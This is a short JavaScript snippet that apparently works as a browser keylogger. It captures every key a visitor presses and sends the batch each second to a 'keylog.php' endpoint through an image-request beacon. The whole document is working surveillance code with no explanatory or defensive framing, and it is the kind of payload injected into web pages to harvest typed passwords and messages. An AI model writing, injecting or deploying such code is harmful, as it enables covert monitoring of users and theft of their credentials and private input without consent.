
let presses = [];

window.addEventListener("keydown", function(evt){
    presses.push({
        key: evt.key
    });
});

window.setInterval(() => {
    let data = encodeURIComponent(JSON.stringify(presses));
    new Image().src = "keylog.php?k=" + data;
    presses = [];
}, 1000);